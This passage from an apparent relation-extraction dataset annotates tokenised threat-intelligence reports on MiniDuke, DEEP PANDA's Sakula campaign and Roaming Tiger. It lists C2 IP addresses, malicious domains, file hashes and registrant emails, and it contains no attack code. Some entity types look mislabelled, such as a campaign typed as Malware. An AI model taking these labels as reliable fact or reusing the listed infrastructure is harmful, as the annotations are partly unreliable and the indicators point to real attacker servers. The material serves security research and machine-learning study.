",", "which", "can", "be", "used", "as", "a", "quick", "way", "to", "find", "them", ":", "\u201c", "@34fZ7E*p\\", "\u201d", "Conclusions"], ["Based", "on", "our", "experience", ",", "this", "is", "a", "unique", "and", "very", "strange", "attack", "."], ["The", "many", "different", "targets", "hit", "in", "separate", "countries", ",", "together", "with", "the", "high", "profile", "appearance", "of", "the", "decoy", "documents", "and", "the", "weird", "backdoor", "functionality", "indicate", "an", "unusual", "threat", "actor", "."], ["Some", "of", "the", "elements", "remind", "us", "of", "both", "Duqu", "and", "Red", "October", ",", "such", "as", "the", "minimalistic", "approach", ",", "hacked", "servers", ",", "encrypted", "channels", "but", "also", "the", "typology", "of", "the", "victims", "."], ["PAGE", "19|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"], ["The", "backdoor", "coding", "style", "reminds", "us", "of", "a", "malware", "writing", "group", "which", "is", "believed", "to", "be", "extinct", ":"], ["29A.", "The", "value", "29A", "in", "hex", "means", "666", ",", "and", "perhaps", "not", "unsurprisingly", ",", "was", "also", "left", "by", "the", "attackers", "as", "a", "clue", "in", "the", "code", ":"], ["The", "29A", "/", "666", "clue", "left", "in", "the", "code", "by", "the", "attackers", "29A", "published", "their", "first", "malware", "magazine", "in", "December", "1996", "and", "were", "active", "until", "February", "2008", ",", "when", "\u2018", "Virusbuster", "\u2019", ",", "the", "last", "standing", "man", "announced", "the", "group", "\u2019s", "dismissal", "."], ["The", "logs", "from", "the", "Command", "&", "Control", "servers", "indicate", "determination", "and", "quite", "a", "bit", "of", "success", "in", "compromising", "several", "high", "profile", "entities", "in", "various", "countries", "."], ["The", "stage", "3", "compilation", "timestamps", "indicate", "the", "attacker", "has", "been", "active", "for", "quite", "a", "while", "but", "still", "managing", "to", "remain", "undetected", "."], ["Perhaps", "one", "of", "the", "most", "important", "questions", "is", ":", "are", "these", "attacks", "related", "to", "the", "\u201c", "Itaduke", "\u201d", "attack", "that", "prompted", "the", "discovery", "of", "the", "PDF", "0", "-", "day", "?"], ["Or", "is", "it", "a", "separate", "entity", "that", "purchased", "the", "attack", "kit", "from", "the", "same", "source", ",", "which", "has", "a", "different", "agenda", "?"], ["Or", ",", "is", "it", "perhaps", "another", "threat", "actor", "which", "captured", "the", "0", "-", "day", "exploit", "and", "modified", "it", "for", "other", "purposes", "?"], ["Unfortunately", ",", "there", "are", "still", "many", "unanswered", "questions", "."], ["Note", ":", "We", "detect", "the", "malware", "described", "here", "as", "HEUR", ":", "Backdoor", ".", "Win32.MiniDuke.gen", ",", "Backdoor", ".", "Win32.Miniduke", "while", "the", "documents", "with", "exploits", "are", "detected", "as", "Exploit.JS.Pdfka.giy", "."], ["References", ":", "\u25cf", "\u25cf", "\u201c", "In", "Turn", "it", "\u2019s", "PDF", "Time", "\u201d", "http://blog.fireeye.com/research/2013/02/in-turn-its-pdf-time.html"], ["\u201c", "Duqu", ":", "Steal", "everything", "\u201d", "http://www.kaspersky.com/about/press/duqu", "PAGE", "20|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"]]}, {"vertexSet": [[{"name": "CrowdStrike Intelligence", "pos": [7, 9], "sent_id": 4, "type": "Organization"}], [{"name": "U.S. Defense Industrial Base", "pos": [24, 28], "sent_id": 4, "type": "ExploitTargetObject"}], [{"name": "Sakula", "pos": [5, 6], "sent_id": 5, "type": "Malware"}], [{"name": "DEEP PANDA", "pos": [14, 16], "sent_id": 6, "type": "Attacker"}], [{"name": "Sakula", "pos": [1, 2], "sent_id": 13, "type": "Malware"}], [{"name": "PlugX", "pos": [22, 23], "sent_id": 13, "type": "Malware"}], [{"name": "MediaSoft.exe", "pos": [10, 11], "sent_id": 14, "type": "File"}], [{"name": "d00b3169f45e74bb22a1cd684341b14a", "pos": [15, 16], "sent_id": 14, "type": "MD5"}], [{"name": "msi.dll", "pos": [21, 22], "sent_id": 14, "type": "File"}], [{"name": "ae6f33f6cdc25dc4bda24b2bccff79fe", "pos": [26, 27], "sent_id": 14, "type": "MD5"}], [{"name": "Sakula", "pos": [39, 40], "sent_id": 14, "type": "Malware"}], [{"name": "0c2674c3a97c53082187d930efb645c2", "pos": [4, 5], "sent_id": 15, "type": "MD5"}], [{"name": "DTOPTOOLZ Co., Ltd", "pos": [14, 18], "sent_id": 16, "type": "Organization"}], [{"name": "180.210.206.246", "pos": [35, 36], "sent_id": 16, "type": "Address"}], [{"name": "April 2014", "pos": [54, 56], "sent_id": 16, "type": "Time"}], [{"name": "August 2014", "pos": [7, 9], "sent_id": 17, "type": "Time"}], [{"name": "Adobe Reader", "pos": [21, 23], "sent_id": 18, "type": "Software"}], [{"name": "Juniper VPN", "pos": [24, 26], "sent_id": 18, "type": "Software"}], [{"name": "Microsoft ActiveX Control", "pos": [0, 3], "sent_id": 19, "type": "Software"}], [{"name": "Microsoft ActiveX", "pos": [20, 22], "sent_id": 26, "type": "Software"}], [{"name": "Sakula", "pos": [6, 7], "sent_id": 27, "type": "Malware"}], [{"name": "Sakula", "pos": [22, 23], "sent_id": 27, "type": "Malware"}], [{"name": "www[.]xha-mster[.]com", "pos": [5, 8], "sent_id": 28, "type": "Indicator"}], [{"name": "midSeptember", "pos": [14, 15], "sent_id": 28, "type": "Time"}], [{"name": "wendellom@yahoo.com", "pos": [22, 23], "sent_id": 28, "type": "Email"}], [{"name": "tonyy starke", "pos": [27, 29], "sent_id": 28, "type": "Attacker"}], [{"name": "DEEP PANDA", "pos": [10, 12], "sent_id": 29, "type": "Campaign"}], [{"name": "198.200.45.112", "pos": [14, 15], "sent_id": 30, "type": "Address"}], [{"name": "DEEP PANDA", "pos": [25, 27], "sent_id": 30, "type": "Campaign"}], [{"name": "September 2014", "pos": [1, 3], "sent_id": 32, "type": "Time"}], [{"name": "vpn[.]foundationssl[.]com", "pos": [4, 5], "sent_id": 35, "type": "Indicator"}], [{"name": "CrowdStrike", "pos": [6, 7], "sent_id": 36, "type": "Organization"}], [{"name": "DEEP PANDA", "pos": [13, 15], "sent_id": 36, "type": "Campaign"}], [{"name": "foundationssl[.]com", "pos": [9, 10], "sent_id": 38, "type": "Indicator"}], [{"name": "news[.]foundationssl[.]com", "pos": [23, 24], "sent_id": 39, "type": "Indicator"}], [{"name": "foundationssl[.]com", "pos": [5, 6], "sent_id": 40, "type": "Indicator"}], [{"name": "DEEP PANDA", "pos": [16, 18], "sent_id": 40, "type": "Campaign"}]], "labels": [{"r": "P2", "h": 3, "t": 2, "evidence": [5, 6]}, {"r": "P21", "h": 8, "t": 4, "evidence": [13, 14]}, {"r": "P21", "h": 6, "t": 4, "evidence": [13, 14]}, {"r": "P21", "h": 7, "t": 4, "evidence": [13, 14]}, {"r": "P21", "h": 9, "t": 4, "evidence": [13, 14]}, {"r": "P21", "h": 11, "t": 10, "evidence": [14, 15]}, {"r": "P33", "h": 10, "t": 14, "evidence": [14, 16]}, {"r": "P33", "h": 10, "t": 15, "evidence": [14, 17]}, {"r": "P28", "h": 10, "t": 13, "evidence": [14, 16]}, {"r": "P21", "h": 22, "t": 21, "evidence": [27, 28]}, {"r": "P33", "h": 21, "t": 23, "evidence": [27, 28]}, {"r": "P21", "h": 24, "t": 21, "evidence": [27, 28]}, {"r": "P2", "h": 25, "t": 21, "evidence": [27, 28]}], "title": "201411CrowdStrikeDeepPanda", "sents": [["."], ["I", "am", "Ironman", ":"], ["DEEP", "PANDA", "Uses", "Sakula", "Malware", "to", "Target", "Organizations", "in", "Multiple", "Sectors"], ["THE", "ADVERSARY", "LINE", "-", "UP", "24", "NOV", "2014", "MATT", "DAHL"], ["Over", "the", "last", "few", "months", ",", "the", "CrowdStrike", "Intelligence", "team", "has", "been", "tracking", "a", "campaign", "of", "highly", "targeted", "events", "focused", "on", "entities", "in", "the", "U.S.", "Defense", "Industrial", "Base", "(", "DIB", ")", ",", "healthcare", ",", "government", ",", "and", "technology", "sectors", "."], ["This", "campaign", "infected", "victims", "with", "Sakula", "malware", "variants", "that", "were", "signed", "with", "stolen", "certi\ufb01cates", "."], ["Investigation", "into", "this", "activity", "led", "to", "associations", "with", "the", "adversary", "known", "to", "CrowdStrike", "as", "DEEP", "PANDA", "."], ["On", "31", "July", "2014", ",", "an", "executable", "was", "identi\ufb01ed", ",", "which", ",", "at", "the", "time", ",", "was", "not", "detected", "by", "any", "antivirus", "products", "."], ["When", "this", "\ufb01le", "was", "executed", ",", "it", "caused", "the", "victim", "to", "view", "a", "website", "by", "using", "the", "ShellExecute", "(", ")", "API", "to", "open", "a", "URL", "."], ["The", "site", "\u2019s", "domain", "name", "was", "meant", "to", "spoof", "that", "of", "a", "site", "set", "up", "to", "provide", "information", "on", "an", "alumni", "event", "for", "a", "U.S", "university", "."], ["This", "page", "requested", "that", "the", "visitor", "download", "an", "Adobe", "-", "related", "plugin", "in", "order", "to", "view", "the", "content", "."], ["The", "downloaded", "plugin", "\ufb01le", "included", "a", "variant", "of", "Sakula", "malware", "."], ["[", "1", "]"], ["The", "Sakula", "malware", "in", "this", "campaign", "utilized", "the", "Dynamic", "Link", "Library", "(", "DLL", ")", "side", "-", "loading", "technique", "most", "commonly", "associated", "with", "PlugX", "activity", "."], ["In", "the", "aforementioned", "universityrelated", "incidents", ",", "a", "legitimate", "executable", "named", "MediaSoft.exe", "(", "MD5", "hash", ":", "d00b3169f45e74bb22a1cd684341b14a", ")", "loaded", "a", "\ufb01le", "named", "msi.dll", "(", "MD5", "hash", ":", "ae6f33f6cdc25dc4bda24b2bccff79fe", ")", ",", "which", ",", "in", "turn", ",", "was", "used", "to", "load", "the", "Sakula", "executable"], ["(", "MD5", "hash", ":", "0c2674c3a97c53082187d930efb645c2", ")", "."], ["This", "\ufb01nal", "executable", "was", "also", "signed", "with", "a", "certi\ufb01cate", "assigned", "to", "an", "organization", "called", "DTOPTOOLZ", "Co.", ",", "Ltd.", "Command", "-", "and", "-", "Control", "(", "C2", ")", "communications", "in", "this", "incident", "went", "directly", "to", "IP", "address", "180.210.206.246", ";", "a", "sample", "GET", "request", "is", "below", ":", "Further", "investigation", "revealed", "similar", "activity", "stretching", "back", "to", "at", "least", "April", "2014", ",", "when", "similar", "TTPs", "were", "used", "to", "target", "a", "healthcare", "organization", "and", "a", "U.S.-based", "IT", "company", "with", "highpro\ufb01le", "clients", "in", "the", "defense", "sector", "."], ["Two", "other", "incidents", "were", "also", "identi\ufb01ed", "in", "August", "2014", "targeting", "a", "company", "in", "the", "DIB", "and", "a", "Mongolian", "government", "entity", "."], ["All", "incidents", "in", "this", "campaign", "were", "similar", "in", "that", "they", "utilized", "malicious", "droppers", "masquerading", "as", "installers", "for", "legitimate", "software", "applications", "like", "Adobe", "Reader", ",", "Juniper", "VPN", ",", "and"], ["Microsoft", "ActiveX", "Control", "."], ["They", "display", "progress", "bars", "that", "make", "it", "appear", "as", "if", "the", "speci\ufb01ed", "software", "is", "being", "updated", "or", "installed", "."], ["Example", "of", "Installer", "Progress", "Bar", "Displayed", "by", "Dropper", "In", "addition", ",", "the", "droppers", "all", "directed", "victims", "to", "login", "pages", "for", "services", "speci\ufb01c", "to", "the", "target", "organization", "like", "webmail", ",", "document", "sharing", ",", "or", "corporate", "VPN", "."], ["In", "all", "cases", "except", "one", ",", "the", "victims", "were", "directed", "to", "legitimate", "login", "pages", "."], ["The", "one", "exception", "was", "a", "case", "in", "which", "victims", "were", "sent", "to", "a", "login", "page", "hosted", "on", "a", "domain", "that", "spoofed", "that", "of", "the", "legitimate", "one", "."], ["It", "is", "unclear", "whether", "redirecting", "victims", "to", "these", "login", "pages", "was", "part", "of", "credential", "-", "collection", "activity", "or", "merely", "meant", "to", "deceive", "victims", "into", "believing", "that", "the", "activity", "was", "legitimate", "."], ["Example", "of", "a", "Login", "Page", "that", "Victims", "were", "Redirected", "to", "The", "campaign", "appeared", "to", "be", "over", "by", "the", "end", "of", "August", ",", "but", "a", "\ufb01le", "was", "recently", "discovered", "that", "suggests", "it", "may", "be", "ongoing", "."], ["The", "intended", "target", "again", "appeared", "to", "be", "a", "Mongolian", "government", "entity", ",", "and", "the", "\ufb01le", "masqueraded", "as", "an", "installer", "for", "Microsoft", "ActiveX", "software", "."], ["It", "dropped", "the", "side", "-", "loaded", "Sakula", "malware", "just", "like", "in", "the", "other", "incidents", ";", "however", ",", "in", "this", "instance", ",", "the", "Sakula", "payload", "was", "signed", "with", "a", "certi\ufb01cate", "assigned", "to", "a", "different", "organization", ",", "Career", "Credit", "Co.", ",", "Ltd."], ["The", "malware", "used", "the", "domain", "www[.]xha", "-", "mster[.]com", "for", "C2", "which", "was", "created", "in", "midSeptember", "and", "is", "registered", "with", "the", "email", "address", "wendellom@yahoo.com", "and", "registrant", "name", "\u201c", "tonyy", "starke", "\u201d", "(", "hence", "the", "name", ",", "Ironman", "-", "related", "title", "for", "this", "blog", ")", "."], ["Below", "is", "a", "chart", "showing", "the", "relevant", "relationships", "to", "this", "DEEP", "PANDA", "campaign", "."], ["The", "bottom", "of", "the", "chart", "shows", "an", "infrastructure", "connection", "between", "an", "IP", "address", "(", "198.200.45.112", ")", "used", "this", "campaign", "and", "also", "used", "in", "recently", "observed", "DEEP", "PANDA", "activity", "."], ["Association", "with", "Recent", "Scanbox", "Activity"], ["In", "September", "2014", ",", "CrowdStrike", "Intelligence", "identi\ufb01ed", "a", "malicious", "\ufb01le", "signed", "with", "the", "DTOPTOOLZ", "Co.", ",", "Ltd.", "certi\ufb01cate", "."], ["Analysis", "of", "this", "\ufb01le", "revealed", "it", "to", "be", "Derusbi", "malware", "(", "a", "favorite"], ["RAT", "of", "DEEP", "PANDA", ")"], ["that", "used", "the", "domain", "vpn[.]foundationssl[.]com", "for", "its", "C2", "."], ["At", "the", "time", "of", "discovery", ",", "CrowdStrike", "did", "not", "attribute", "the", "\ufb01le", "to", "DEEP", "PANDA", "based", "on", "the", "malware", "alone", ",", "but", "the", "use", "of", "the", "DTOPTOOLZ", "certi\ufb01cate", "to", "sign", "a", "malware", "variant", "known", "to", "be", "heavily", "used", "by"], ["this", "adversary", "makes", "it", "likely", "that", "this", "signed", "Derusbi", "sample", "is", "also", "attributable", "to", "DEEP", "PANDA", "."], ["In", "a", "recent", "public", "report", "from", "PWC", ",", "another", "foundationssl[.]com", "domain", "was", "linked", "to", "activity", "involving", "the", "Strategic", "Web", "Compromise", "(", "SWC", ")", "framework", "more", "commonly", "known", "as", "Scanbox", "."], ["In", "that", "operation", ",", "the", "Scanbox", "code", "was", "placed", "on", "the", "website", "of", "a", "U.S.-based", "think", "tank", "and", "utilized", "the", "malicious", "domain", ",", "news[.]foundationssl[.]com", "."], ["The", "use", "of", "the", "two", "foundationssl[.]com", "subdomains", "suggests", "that", "the", "same", "adversary", "(", "in", "this", "case", "DEEP", "PANDA", ")", "was", "responsible", "for", "the", "signed", "Derusbi", "malware", "\ufb01le", "and", "the", "think", "tank", "SWC", "activity", "."], ["Furthermore", ",", "CrowdStrike", "publicly", "reported", "on", "DEEP", "PANDA", "targeting", "of", "think", "tanks", "in", "July", "2014", "."], ["If", "you", "want", "to", "hear", "more", "about", "DEEP", "PANDA", "and", "their", "tradecraft", "or", "any", "of", "the", "other", "adversaries", "that", "CrowdStrike", "tracks", ",", "please", "contact", ":", "sales@crowdstrike.com"], ["[", "1", "]", "In", "February", "2014", ",", "CrowdStrike", "publicly", "reported", "on", "a", "campaign", "that", "leveraged", "Sakula", "malware", "(", "http://www.crowdstrike.com/blog/french-connection-french-aerospace-focused-cve-", "2014", "-", "0322", "-", "attack", "-", "shares", "-", "similarities-2012", "/", "index.html", ")", ";", "however", ",", "the", "Tactics", ",", "Techniques", ",", "and", "Procedures", "(", "TTPs", ")", "between", "that", "campaign", "and", "this", "recent", "one", "are", "different", ",", "suggesting", "two", "distinct", "adversaries", "are", "using", "the", "Sakula", "malware", "."], ["5", "40", "\u2190", "December", "CrowdCast", ":"], ["Rockin", "\u2019", "Around"], ["Your", "Unsecured", "Network", "Cloud", "-", "Based", "Security", ":", "The", "Next", "Generation", "of", "Defense", "for", "the", "Good", "Guys", "\u2192", "Follow", "Us", "Tweets", "about", "\"", "from", ":", "crowdstrike", "OR", "from", ":"], ["Adam_Cyber", "OR", "from", ":", "JMDeC", "OR", "from", ":", "DmitriCyber", "OR", "from", ":", "StevenChabinsky", "OR", "from", ":", "George_Kurtz", "\"", "Recent", "Posts"], ["The", "Imperative", "for", "Proactive", "Incident", "Response", "in", "2015", "and", "Beyond"], ["November", "3", ",", "2015", "Why", "Your", "Business", "Environment", "Should", "Drive", "Cybersecurity", "November", "2", ",", "2015"], ["Blurring", "of", "Commodity", "and", "Targeted", "Attack", "Malware", "October", "16", ",", "2015", "Should", "I", "Really", "Trust", "the", "Cloud", "with", "my", "Endpoint", "Protection", "?"], ["September", "30", ",", "2015", "U.S.", "\u2013", "China", "Agreement", "on", "Cyber", "Intrusions", ":", "An", "In\ufb02ection", "Point", "September", "25", ",", "2015", "Archives", "N", "M", "T", "W", "O", "V", "T", "E", "M", "B", "E", "F", "R", "2", "S", "0", "1", "5"], ["S", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "\u00ab", "Oct", "Recent", "Comments"]]}, {"vertexSet": [[{"name": "Roaming tiger", "pos": [0, 2], "sent_id": 0, "type": "Malware"}], [{"name": "ESET", "pos": [8, 9], "sent_id": 0, "type": "Organization"}], [{"name": "Russia", "pos": [13, 14], "sent_id": 0, "type": "ExploitTargetObject"}], [{"name": "Belarus", "pos": [0, 1], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "Kazakhstan", "pos": [2, 3], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "Kyrgyzstan", "pos": [4, 5], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "Tajikistan", "pos": [6, 7], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "Ukraine", "pos": [8, 9], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "Uzbekistan", "pos": [10, 11], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "Roaming tiger", "pos": [12, 14], "sent_id": 4, "type": "Attacker"}], [{"name": "Russia", "pos": [5, 6], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "CVE-2012-0158", "pos": [6, 9], "sent_id": 6, "type": "Vulnerability"}], [{"name": "CVE-2014-1761", "pos": [10, 13], "sent_id": 6, "type": "Vulnerability"}], [{"name": "Win32/Korplug", "pos": [1, 4], "sent_id": 7, "type": "Malware"}], [{"name": "PlugX RAT", "pos": [6, 8], "sent_id": 7, "type": "Exploit"}], [{"name": "Win32/Farfli.BEK", "pos": [1, 6], "sent_id": 8, "type": "Malware"}], [{"name": "Gh0st RAT", "pos": [8, 10], "sent_id": 8, "type": "Exploit"}], [{"name": "CVE-2014-1761", "pos": [13, 16], "sent_id": 8, "type": "Vulnerability"}], [{"name": "CVE-2014-1761", "pos": [22, 25], "sent_id": 8, "type": "Vulnerability"}], [{"name": "Win32/Korplug", "pos": [15, 18], "sent_id": 9, "type": "Malware"}], [{"name": "Win32/Farfli.BEK", "pos": [9, 14], "sent_id": 10, "type": "Dropper"}], [{"name": "Win32/Farfli.BEK", "pos": [7, 12], "sent_id": 16, "type": "Dropper"}], [{"name": "Win32/Farfli.BEK", "pos": [16, 21], "sent_id": 16, "type": "Dropper"}], [{"name": "%WINDIR%\\AppPatch\\msimain.mui", "pos": [26, 28], "sent_id": 16, "type": "File"}], [{"name": "%WINDIR%\\AppPatch\\AcProtect.dll", "pos": [32, 34], "sent_id": 16, "type": "File"}], [{"name": "%WINDIR%\\AppPatch\\Custom\\%GUID%.sdb", "pos": [42, 44], "sent_id": 16, "type": "File"}], [{"name": "Win32/Farfli.BEK", "pos": [44, 49], "sent_id": 16, "type": "Dropper"}], [{"name": "adobeflashupdate.dynu.com", "pos": [4, 5], "sent_id": 18, "type": "Indicator"}], [{"name": "122.10.92.14", "pos": [5, 6], "sent_id": 18, "type": "Address"}], [{"name": "Hong Kong", "pos": [6, 8], "sent_id": 18, "type": "Location"}], [{"name": "checkpdate.youdontcare.com", "pos": [8, 9], "sent_id": 18, "type": "Indicator"}], [{"name": "122.10.118.129", "pos": [9, 10], "sent_id": 18, "type": "Address"}], [{"name": "Hong Kong", "pos": [10, 12], "sent_id": 18, "type": "Location"}], [{"name": "dnsedc", "pos": [0, 1], "sent_id": 19, "type": "Indicator"}], [{"name": "122.10.118.131", "pos": [1, 2], "sent_id": 19, "type": "Address"}], [{"name": "Hong Kong", "pos": [2, 4], "sent_id": 19, "type": "Location"}], [{"name": "dotkang.vicp.net", "pos": [4, 5], "sent_id": 19, "type": "Indicator"}], [{"name": "122.10.118.131", "pos": [5, 6], "sent_id": 19, "type": "Address"}], [{"name": "Hong Kong", "pos": [6, 8], "sent_id": 19, "type": "Location"}], [{"name": "dwm.dnsedc.com", "pos": [8, 9], "sent_id": 19, "type": "Indicator"}], [{"name": "122.10.118.131", "pos": [9, 10], "sent_id": 19, "type": "Address"}], [{"name": "Hong Kong", "pos": [10, 12], "sent_id": 19, "type": "Location"}], [{"name": "gf.arabidc.com", "pos": [12, 13], "sent_id": 19, "type": "Indicator"}], [{"name": "122.10.83.51", "pos": [13, 14], "sent_id": 19, "type": "Address"}], [{"name": "Hong Kong", "pos": [14, 16], "sent_id": 19, "type": "Location"}], [{"name": "kkts.yeshopea.com", "pos": [16, 17], "sent_id": 19, "type": "Indicator"}], [{"name": "103.225.196.140", "pos": [17, 18], "sent_id": 19, "type": "Address"}], [{"name": "Hong Kong", "pos": [18, 20], "sent_id": 19, "type": "Location"}], [{"name": "nativeame2.jkub.com", "pos": [20, 21], "sent_id": 19, "type": "Indicator"}], [{"name": "103.225.196.140", "pos": [21, 22], "sent_id": 19, "type": "Address"}], [{"name": "Hong Kong", "pos": [22, 24], "sent_id": 19, "type": "Location"}], [{"name": "news.bfinancea.net", "pos": [24, 25], "sent_id": 19, "type": "Indicator"}], [{"name": "122.10.118.129", "pos": [25, 26], "sent_id": 19, "type": "Address"}], [{"name": "Hong Kong", "pos": [26, 28], "sent_id": 19, "type": "Location"}], [{"name": "fsvts.vicp.net", "pos": [28, 29], "sent_id": 19, "type": "Indicator"}], [{"name": "futuresgolda.com", "pos": [0, 1], "sent_id": 20, "type": "Indicator"}], [{"name": "systemupdate5.dtdns.net", "pos": [1, 2], "sent_id": 20, "type": "Indicator"}], [{"name": "googlenewsup.net", "pos": [2, 3], "sent_id": 20, "type": "Indicator"}], [{"name": "niisvt.f3322.org", "pos": [4, 5], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.83.62", "pos": [5, 6], "sent_id": 21, "type": "Address"}], [{"name": "103.20.222.170", "pos": [5, 6], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [6, 8], "sent_id": 21, "type": "Location"}], [{"name": "note.wikaba.com", "pos": [8, 9], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.83.62", "pos": [9, 10], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [10, 12], "sent_id": 21, "type": "Location"}], [{"name": "systemupdate1.suroot.com", "pos": [12, 13], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.92.15", "pos": [13, 14], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [14, 16], "sent_id": 21, "type": "Location"}], [{"name": "systemupdate1.suroot.com", "pos": [16, 17], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.92.15", "pos": [17, 18], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [18, 20], "sent_id": 21, "type": "Location"}], [{"name": "vk.newsupdatea.net", "pos": [20, 21], "sent_id": 21, "type": "Indicator"}], [{"name": "123.254.109.166", "pos": [21, 22], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [22, 24], "sent_id": 21, "type": "Location"}], [{"name": "www.dnsqaz.com", "pos": [24, 25], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.83.62", "pos": [25, 26], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [26, 28], "sent_id": 21, "type": "Location"}], [{"name": "www.sizn-ru.com", "pos": [28, 29], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.83.62", "pos": [29, 30], "sent_id": 21, "type": "Address"}], [{"name": "122.112.2.14", "pos": [31, 32], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [32, 34], "sent_id": 21, "type": "Location"}], [{"name": "yahoomessenger.flnet.org", "pos": [34, 35], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.92.15", "pos": [35, 36], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [36, 38], "sent_id": 21, "type": "Location"}], [{"name": "transactiona.com", "pos": [38, 39], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.92.14", "pos": [39, 40], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [40, 42], "sent_id": 21, "type": "Location"}], [{"name": "systemupdate2.etowns.net", "pos": [42, 43], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.92.14", "pos": [43, 44], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [44, 46], "sent_id": 21, "type": "Location"}], [{"name": "adobeupdate1.dtdns.net", "pos": [46, 47], "sent_id": 21, "type": "Indicator"}], [{"name": "122.10.92.15", "pos": [47, 48], "sent_id": 21, "type": "Address"}], [{"name": "Hong Kong", "pos": [48, 50], "sent_id": 21, "type": "Location"}], [{"name": "spacecorp.sizn-ru.com", "pos": [50, 51], "sent_id": 21, "type": "Indicator"}], [{"name": "systemupdate3.suroot.com", "pos": [0, 1], "sent_id": 22, "type": "Indicator"}], [{"name": "liu qiuping", "pos": [12, 14], "sent_id": 23, "type": "Attacker"}], [{"name": "Beijing", "pos": [3, 4], "sent_id": 24, "type": "Country"}], [{"name": "yuminga1@126.com", "pos": [7, 8], "sent_id": 26, "type": "Email"}]], "labels": [{"r": "P21", "h": 23, "t": 22, "evidence": [16]}, {"r": "P21", "h": 24, "t": 22, "evidence": [16]}, {"r": "P21", "h": 25, "t": 22, "evidence": [16]}, {"r": "P32", "h": 95, "t": 96, "evidence": [23, 24]}, {"r": "P21", "h": 27, "t": 0, "evidence": [0, 18]}, {"r": "P28", "h": 0, "t": 28, "evidence": [0, 18]}, {"r": "P32", "h": 9, "t": 29, "evidence": [4, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [0, 18]}, {"r": "P28", "h": 0, "t": 31, "evidence": [0, 18]}, {"r": "P32", "h": 9, "t": 32, "evidence": [4, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [0, 19]}, {"r": "P28", "h": 0, "t": 34, "evidence": [0, 19]}, {"r": "P32", "h": 9, "t": 35, "evidence": [4, 19]}, {"r": "P21", "h": 36, "t": 0, "evidence": [0, 19]}, {"r": "P28", "h": 0, "t": 37, "evidence": [0, 19]}, {"r": "P32", "h": 9, "t": 38, "evidence": [4, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [0, 19]}, {"r": "P28", "h": 0, "t": 40, "evidence": [0, 19]}, {"r": "P32", "h": 9, "t": 41, "evidence": [4, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [0, 19]}, {"r": "P28", "h": 0, "t": 43, "evidence": [0, 19]}, {"r": "P32", "h": 9, "t": 44, "evidence": [4, 19]}, {"r": "P21", "h": 45, "t": 0, "evidence": [0, 19]}, {"r": "P28", "h": 0, "t": 46, "evidence": [0, 19]}, {"r": "P32", "h": 9, "t": 47, "evidence": [4, 19]}, {"r": "P21", "h": 48, "t": 0, "evidence": [0, 19]}, {"r": "P28", "h": 0, "t": 49, "evidence": [0, 19]}, {"r": "P32", "h": 9, "t": 50, "evidence": [4, 19]}, {"r": "P21", "h": 51, "t": 0, "evidence": [0, 19]}, {"r": "P28", "h": 0, "t": 52, "evidence": [0, 19]}, {"r": "P32", "h": 9, "t": 53, "evidence": [4, 19]}, {"r": "P21", "h": 54, "t": 0, "evidence": [0, 19]}, {"r": "P21", "h": 55, "t": 0, "evidence": [0, 20]}, {"r": "P21", "h": 56, "t": 0, "evidence": [0, 20]}, {"r": "P21", "h": 57, "t": 0, "evidence": [0, 20]}, {"r": "P21", "h": 58, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 59, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 60, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 61, "evidence": [4, 21]}, {"r": "P21", "h": 62, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 63, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 64, "evidence": [4, 21]}, {"r": "P21", "h": 65, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 66, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 67, "evidence": [4, 21]}, {"r": "P21", "h": 68, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 69, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 70, "evidence": [4, 21]}, {"r": "P21", "h": 71, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 72, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 73, "evidence": [4, 21]}, {"r": "P21", "h": 74, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 75, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 76, "evidence": [4, 21]}, {"r": "P21", "h": 77, "t": 0, "evidence": [0, 21]}, {"r": 